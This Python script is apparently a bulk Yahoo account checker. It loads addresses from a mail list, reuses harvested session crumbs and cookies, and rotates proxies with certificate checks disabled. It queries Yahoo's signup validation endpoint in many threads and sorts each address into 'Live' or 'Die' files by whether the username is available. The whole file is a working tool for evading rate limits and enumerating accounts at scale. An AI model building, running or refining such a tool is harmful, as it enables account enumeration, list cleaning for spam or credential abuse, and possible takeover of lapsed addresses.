import requests
import re
import os
import random
import json
from collections import Counter
from requests.exceptions import RequestException
from urllib3.exceptions import InsecureRequestWarning
from urllib3 import disable_warnings
from concurrent.futures import ThreadPoolExecutor
import threading

disable_warnings(InsecureRequestWarning)

# Counter to track session file usage
session_usage_counter = Counter()

# Lock for thread-safe access to session files
session_file_lock = threading.Lock()

def load_proxies(file_path):
    if not os.path.exists(file_path):
        raise FileNotFoundError("Proxy file does not exist.")

    with open(file_path, "r") as file:
        proxies = [
            line.strip() for line in file
            if re.match(r'^(([^:@\s]+:[^:@\s]+@)?[^:@\s]+:[0-9]+)$', line.strip())
        ]

    if not proxies:
        raise ValueError("No valid proxies found in the proxy file.")

    return proxies

def get_random_proxy(proxies):
    if not proxies:
        raise ValueError("Proxy list is empty.")
    return random.choice(proxies)

def load_user_ids(file_path):
    if not os.path.exists(file_path):
        raise FileNotFoundError("Mail file does not exist.")

    with open(file_path, "r") as file:
        user_lines = {
            re.split(r"[@:|]", line.strip())[0]: line.strip() for line in file
            if "@yahoo.com" in line.strip()
        }  # Use a dictionary to remove duplicate userIds

    if not user_lines:
        raise ValueError("No valid Yahoo email addresses found in the file.")

    return list(user_lines.values())  # Return unique original lines

def get_random_session_file(session_folder):
    global session_usage_counter

    with session_file_lock:  # Ensure thread-safe access
        # Get a list of all files in the session folder
        session_files = [f for f in os.listdir(session_folder) if f.endswith('.json')]

        # Filter out files used more than 3 times
        available_files = [f for f in session_files if session_usage_counter[f] < 3]

        if not available_files:
            raise ValueError("No available session files (max usage reached for all files).")

        # Select a random available file
        selected_file = random.choice(available_files)
        session_usage_counter[selected_file] += 1

        # Delete the file if it reaches the maximum usage limit
        if session_usage_counter[selected_file] >= 3:
            os.remove(os.path.join(session_folder, selected_file))

        return os.path.join(session_folder, selected_file)

def fetch_from_random_session_file(userId, proxies):
    try:
        # Check if the session folder exists
        session_folder = "session"
        if not os.path.exists(session_folder):
            raise FileNotFoundError("Session folder does not exist.")

        # Get a random session file with limited usage
        random_file_path = get_random_session_file(session_folder)

        # Load data from the selected file
        with open(random_file_path, "r") as file:
            session_data = json.load(file)

        # Ensure required keys exist
        if not all(key in session_data for key in ["crumb", "acrumb", "sessionIndex", "cookies"]):
            raise ValueError("Invalid session file format. Missing required keys.")

        # Extract values
        crumb_value = session_data["crumb"]
        acrumb_value = session_data["acrumb"]
        session_index_value = session_data["sessionIndex"]
        cookies = session_data["cookies"]

        # Prepare POST request
        post_url = "https://login.yahoo.com/account/module/create?validateField=userId"
        payload = {
            'crumb': crumb_value,
            'acrumb': acrumb_value,
            'sessionIndex': session_index_value,
            'userid-domain': 'yahoo',
            'userId': userId
        }
        headers = {
            'accept': '*/*',
            'accept-language': 'en',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://login.yahoo.com',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
            'x-requested-with': 'XMLHttpRequest'
        }

        # Select a random proxy
        selected_proxy = get_random_proxy(proxies)
        proxy_dict = {"http": f"http://{selected_proxy}", "https": f"http://{selected_proxy}"}

        # Send the POST request
        with requests.Session() as session:
            session.cookies.update(cookies)
            response = session.post(post_url, headers=headers, data=payload, proxies=proxy_dict, verify=False)

            # Analyze the response
            if '"name":"userId","error":"IDENTIFIER_NOT_AVAILABLE"' in response.text:
                return True
            if '"name":"userId","error":"IDENTIFIER_EXISTS"' in response.text:
                return True
            if '{"errors":[{"name":"firstName","error":"FIELD_EMPTY"},{"name":"lastName","error":"FIELD_EMPTY"},{"name":"birthDate","error":"FIELD_EMPTY"},{"name":"password","error":"FIELD_EMPTY"}]}' in response.text:
                return False

        return 'Retry'

    except FileNotFoundError as e:
        return 'Retry'
    except ValueError as e:
        return 'Retry'
    except RequestException as e:
        return 'Retry'

def process_user_id(original_line, proxies):
    userId = re.split(r"[@:|]", original_line.strip())[0]
    while True:
        checkYahoo = fetch_from_random_session_file(userId, proxies)
        if checkYahoo == False:
            print(f"Live => {original_line}")
            with open("Live.txt", "a") as live_file:
                live_file.write(f"{original_line}\n")
            break
        elif checkYahoo == True:
            with open("Die.txt", "a") as die_file:
                die_file.write(f"{original_line}\n")
            break
        elif checkYahoo == 'Retry':
            continue

# Main function
if __name__ == "__main__":
    try:
        proxies = load_proxies("proxy.txt")
    except (FileNotFoundError, ValueError) as e:
        print(f"Error loading proxies: {str(e)}")
        proxies = []

    try:
        user_ids = load_user_ids("Mail.txt")
    except (FileNotFoundError, ValueError) as e:
        print(f"Error loading user IDs: {str(e)}")
        user_ids = []

    try:
        num_threads = int(input("Enter the number of threads: "))
    except ValueError:
        print("Invalid input. Using 1 thread.")
        num_threads = 1

    with ThreadPoolExecutor(max_workers=num_threads) as executor:
        for original_line in user_ids:
            executor.submit(process_user_id, original_line, proxies)
